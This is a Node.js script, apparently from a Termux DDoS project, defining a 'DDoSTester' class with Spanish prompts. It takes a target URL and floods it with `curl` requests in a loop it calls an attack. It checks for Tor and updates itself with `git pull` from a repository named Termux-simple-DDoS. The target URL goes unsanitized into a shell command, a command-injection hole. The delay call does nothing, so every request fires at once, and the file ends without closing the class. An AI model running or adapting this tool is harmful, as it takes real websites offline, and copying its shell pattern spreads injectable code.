const childProcess = require('child_process');
const readline = require('readline');

class DDoSTester {
  constructor() {
    this.url = "";
    this.numRequests = 0;
    this.delayBetweenRequests = 0;
    this.torInstalled = false;
  }

  configUrl() {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
    rl.question("Ingrese la URL a probar: ", (url) => {
      this.url = url;
      console.log("URL configurada correctamente.");
      rl.close();
    });
  }

  startAttack() {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
    rl.question("Ingrese el número de solicitudes a enviar: ", (numRequests) => {
      this.numRequests = parseInt(numRequests);
      rl.question("Ingrese el tiempo de espera entre solicitudes (en segundos): ", (delayBetweenRequests) => {
        this.delayBetweenRequests = parseFloat(delayBetweenRequests);
        console.log("Iniciando ataque...");
        for (let i = 0; i < this.numRequests; i++) {
          try {
            childProcess.exec(`curl -s -o /dev/null ${this.url}`, (error, stdout, stderr) => {
              if (error) {
                console.log(`Error sending request: ${error}`);
              } else {
                console.log(`Request ${i+1} sent.`);
              }
            });
            setTimeout(() => {}, this.delayBetweenRequests * 1000);
          } catch (error) {
            console.log(`Error sending request: ${error}`);
          }
        }
        console.log("Ataque finalizado.");
        rl.close();
      });
    });
  }

checkTorStatus() {
childProcess.exec('tor --version', (error, stdout, stderr) => {
if (error) {
console.log("Tor no está instalado.");
} else {
console.log("Tor está instalado.");
}
});
}

updateCode() {
console.log("Actualizando código...");
childProcess.exec('git pull https://github.com/Keiji821/Termux-simple-DDoS-.git', (error, stdout, stderr) => {
if (error) {
console.log(`Error al actualizar el código: ${error}`);
} else {
console.log("Código actualizado correctamente.");
}
});
}